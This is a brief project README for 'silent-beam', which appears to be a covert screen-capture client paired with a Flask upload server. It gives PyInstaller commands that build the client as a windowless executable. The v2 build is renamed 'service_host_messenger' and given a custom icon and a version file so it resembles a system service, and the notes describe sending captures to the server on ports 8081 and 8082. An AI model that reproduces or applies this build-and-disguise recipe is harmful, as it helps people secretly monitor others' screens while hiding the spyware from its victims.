# silent-beam

`mss` and `flask` modules needs to be installed as a global package or `pyinstaller` can not find those.

```python
#Compile client
cd client
pyinstaller --hidden-import=mss --onefile --noconsole --name SilentBeamClient client_main.py
```

```python
#Compile server
cd host
pyinstaller --hidden-import=flask --onefile --noconsole server.py
```

```python
#Run client
python client_main.py 192.168.1.1

#Or
SilentBeamClient.exe 192.168.1.1
```

```python
# Compile new client (v2) with custom icon and process description
cd client
pyinstaller --hidden-import=mss --onefile --noconsole \
  --name service_host_messenger \
  --icon client_icon.ico \
  --version-file version_file.txt \
  client_main.py
```

```python
# Compile new server (v2) on port 8082
cd host
pyinstaller --hidden-import=flask --onefile --noconsole --name SilentBeamServerV2 server_v2.py
```

Notes:

- New client (v2) communicates with the new server on http://<server-ip>:8082 using the /v2 upload path.
- Old client/server continue to use port 8081 without the /v2 path. This allows running both generations simultaneously without duplicate uploads.
